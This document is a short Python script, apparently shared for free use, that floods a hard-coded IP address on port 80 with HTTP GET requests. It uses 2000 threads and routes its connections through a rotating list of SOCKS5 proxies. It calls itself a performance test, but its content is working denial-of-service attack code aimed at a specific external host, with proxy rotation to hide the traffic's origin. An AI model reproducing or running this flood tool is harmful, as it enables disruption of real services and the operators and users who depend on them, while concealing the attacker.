# at least 50mbit/s & 3 cores required
# Tested on Intel I9 3 cores, 1Gbit (60 - 80kr/s) 
# Coded by Chandler free to use
# This was made for testing & maxing out the performance of spamming requests

import socket
import threading
import time
import socks
import os
import random

target = '91.193.113.71'
port = 80

rpc = 5000
threads = 2000

def load_proxies(filename):
    with open(filename, 'r') as f:
        proxies = f.readlines()
    return [proxy.strip().split('//')[1] for proxy in proxies]

proxies = load_proxies('socks5.txt')

def attack():
    while True:
        try:
            proxy = random.choice(proxies)
            s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            s.set_proxy(socks.SOCKS5, proxy.split(':')[0], int(proxy.split(':')[1]))
            s.connect((target, port))
            for _ in range(rpc):
                request = f"GET / HTTP/1.2\r\nHost: {target}\r\n\r\n"
                s.send(request.encode('ascii'))
            s.close()
        except Exception as e:
            print(f"Proxy {proxy} failed: {e}")

def main():
    global threads
    for i in range(threads):
        thread = threading.Thread(target=attack)
        thread.start()

def clear_console():
    while True:
        os.system('cls')
        time.sleep(0.1) # possible memory leak so added this

if __name__ == "__main__":
    clear_thread = threading.Thread(target=clear_console)
    clear_thread.start()
    
    main()
